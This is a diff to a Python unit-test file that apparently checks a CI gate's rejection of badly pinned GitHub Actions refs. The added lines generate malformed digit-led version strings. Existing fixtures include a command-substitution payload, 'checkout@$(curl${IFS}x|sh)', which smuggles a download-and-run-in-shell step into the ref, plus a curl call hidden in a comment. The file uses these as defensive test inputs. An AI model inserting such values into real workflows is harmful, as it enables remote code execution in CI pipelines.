@@ -372,6 +372,10 @@ class HlddGateTests(unittest.TestCase):
             "branch ref": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", "checkout@main")},
             "shell ref": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", "checkout@$(curl${IFS}x|sh)")},
             "shell comment": {".github/workflows/ci.yml": WORKFLOW.replace("# v7.0.0", "# $(curl example.invalid)")},
+            **{
+                f"digit-led ref {ref}": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", f"checkout@{ref}")}
+                for ref in ("1evil", "v1evil", "123main", "1...2", "v7.0.1.2")
+            },
         })
 
     def test_dependabot_pyproject_marker_or_name_change_fails(self):
